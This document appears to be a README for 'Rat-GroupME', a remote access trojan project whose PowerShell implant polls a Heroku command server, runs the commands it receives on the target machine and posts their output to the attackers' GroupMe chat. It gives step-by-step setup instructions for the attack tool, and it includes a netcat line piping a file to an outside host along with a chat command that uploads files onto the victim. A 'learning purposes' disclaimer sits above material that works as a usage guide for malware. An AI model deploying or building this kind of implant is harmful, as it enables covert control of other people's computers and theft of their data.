# Rat-GroupME

_For learning purposes only. I wanted to see how the GroupME API or similar chat-based framework would work as a RAT controller. This is not meant
to be used maliciously._

The implant is the rat.ps1 and is meant to be triggered every X minutes, POSTing to the 
heroku python app asking for what commands to be ran. After running these 
commands, output is sent to the "attackers" in their set groupme chat. 

This is strictly of proof of concept and learning project, so no persistence strategies or task scheduling will be mentioned here. You're on your own.

app.py, runtime.txt, requirements.txt, Procfile, and commands.txt are all necessary on the 
heroku app-side. 

The rat.ps1 will need to be ran from the client.

## Steps to Reproduce
1. Setup a Python HerokuApp using the files I've provided. Heroku Git is a magical thing. 
2. Put the rat.ps1 on the machine you're testing as your client/target machine. As of right now,
I have tested this on Win10. I will be rewriting the script for Powershell 2.0.
3. Make the necessary changes based on your personal API information.

### In rat.ps1: 
* Set bot_id on line 12
* Set GM_TOKEN on line 20
* Provide your HerokuApp URL on line 36
 
### In app.py
* Set bot_id in send_message function
* The conditions that mention the bot's name may need to be changed if your bot is named something other than 'victim'

**For file Uploading**
You'll need to host your file somewhere like pastebin, termbin, or dropfile. 
Ex. - cat file.txt | nc termbin.com 9999
- Get the URL and use it to run your command in chat as such: upload URL OutFilePath

_Please see screenshots folder if confused_

Hope you enjoy, and don't hesitate to email me.
